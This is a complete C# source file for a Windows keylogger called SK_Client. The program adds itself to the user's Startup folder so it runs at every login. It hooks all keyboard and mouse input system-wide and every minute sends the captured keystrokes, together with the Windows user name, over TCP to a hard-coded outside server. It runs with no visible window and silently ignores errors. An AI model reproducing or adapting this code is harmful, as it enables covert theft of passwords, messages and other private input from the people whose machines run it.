using System;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Timers;
using System.Windows.Forms;

using Gma.System.MouseKeyHook;
using IWshRuntimeLibrary;

namespace SK_Client
{
    internal class Client
    {
        // change these values, they specify the server to send the buffer to
        private const string ADDRESS = "yummy.burgermap.org";
        private const int PORT = 25568;
        private const int SEND_FREQUENCY = 60000; // miliseconds

        // hookEvents
        // _hookEventBuffer stores the temporary key and mouse press events, it will be cleared after a buffer is sent to the server
        private static IKeyboardMouseEvents _hookEvents;
        private static string _hookEventBuffer = "";

        private static readonly System.Timers.Timer _bufferSenderTimer = new System.Timers.Timer();

        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            string exePath = Assembly.GetEntryAssembly().Location;
            string shortcutPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\skclient.lnk";

            // create a new shortcut object
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);

            // set the target path for the shortcut
            shortcut.TargetPath = exePath;
            shortcut.WorkingDirectory = Path.GetDirectoryName(exePath);

            // save the shortcut
            shortcut.Save();

            // configure hook events
            _hookEvents = Hook.GlobalEvents();
            _hookEvents.KeyPress += OnKeyPress;
            _hookEvents.MouseClick += OnMouseClick;

            // configure the buffer timer
            _bufferSenderTimer.Elapsed += new ElapsedEventHandler(SendBufferToServer);
            _bufferSenderTimer.Interval = SEND_FREQUENCY;
            _bufferSenderTimer.Enabled = true;

            Application.Run();
        }

        private static void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            _hookEventBuffer += e.KeyChar.ToString();
        }

        private static void OnMouseClick(object sender, MouseEventArgs e)
        {
            _hookEventBuffer += e.Button.ToString();
        }

        private static void SendBufferToServer(object source, ElapsedEventArgs e)
        {
            // skip the buffer send if the user has not raised any events
            if (_hookEventBuffer == "")
                return;

            try
            {
                // create tcpclient
                TcpClient client = new TcpClient();

                // connect to the listener server
                client.Connect(ADDRESS, PORT);
                using (NetworkStream stream = client.GetStream())
                {
                    // get the user's name
                    string currentUser = Environment.UserName;

                    // pack currentUser with _hookEventBuffer using '¶' and convert it to a byte array
                    byte[] buffer = Encoding.UTF8.GetBytes(currentUser + '¶' + _hookEventBuffer);

                    // write and send the byte array to the server
                    stream.Write(buffer, 0, buffer.Length);
                }

                client.Close();

                // clear the buffer
                _hookEventBuffer = "";
            }
            catch
            {

            }
        }
    }
}